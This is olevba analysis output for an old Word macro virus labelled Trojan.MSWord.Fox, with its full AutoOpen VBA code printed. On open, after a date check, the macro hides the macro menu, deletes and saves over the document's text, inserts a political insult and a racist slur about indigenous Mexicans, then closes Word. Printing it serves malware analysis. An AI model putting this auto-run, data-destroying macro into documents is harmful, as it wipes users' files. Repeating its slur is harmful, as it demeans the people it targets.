olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Trojan.MSWord.Fox
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Trojan.MSWord.Fox - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Trojan.MSWord.Fox - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Sub AutoOpen()
Attribute AutoOpen.VB_Description = "Macro grabada el 02/09/01 por Norma Zamudio Montiel"
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.AutoOpen"
'
' AutoOpen Macro
' Macro grabada el 02/09/01 por Norma Zamudio Montiel
'
CommandBars("Tools").Controls("Macro").Visible = False

If WordBasic.Day(WordBasic.Now()) > 10 And WordBasic.Month(WordBasic.Now()) > 8 Then
    Selection.WholeStory
    Selection.Delete Unit:=wdCharacter, Count:=1
    ActiveDocument.Save
    Selection.ParagraphFormat.Alignment = wdAlignParagraphCenter
    Selection.Font.ColorIndex = wdRed
    Selection.Font.Bold = wdToggle
    Selection.Font.Size = 26
    Selection.Font.Name = "Arial"
    Selection.TypeText Text:="SISTEMA e-MÉXICO"
    Selection.TypeParagraph
    Selection.TypeParagraph
    Selection.Font.ColorIndex = wdBlack
    Selection.Font.Bold = wdToggle
    Selection.Font.Size = 20
    Selection.Font.Name = "Times New Roman"
    Selection.TypeText Text:="INTERNET para todos los indios..."
    Selection.TypeParagraph
    Selection.TypeParagraph
    Selection.TypeText Text:="...aunque no tengan que tragar!!!"
    Selection.TypeParagraph
    Selection.TypeParagraph
    Selection.TypeText Text:="Pinche FOX pendejete!!!"
    ActiveDocument.Save
    ActiveDocument.Close
    Application.Quit
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

